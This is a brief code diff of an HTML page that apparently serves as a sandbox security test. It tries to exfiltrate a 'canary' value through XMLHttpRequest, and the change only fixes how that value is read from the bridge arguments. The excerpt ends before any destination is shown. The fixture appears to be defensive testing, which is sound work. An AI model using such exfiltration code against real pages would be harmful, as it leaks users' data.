@@ -3,7 +3,7 @@
 <title>attack: XMLHttpRequest</title>
 <!-- ATTACK: exfiltrate via XMLHttpRequest. Same defenses as fetch. -->
 <script>
-  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const canary = ((window.bridge.getArgs() || {}).args || {}).canary || {};
   const r = { attack: 'xhr' };
   try {
     const xhr = new XMLHttpRequest();
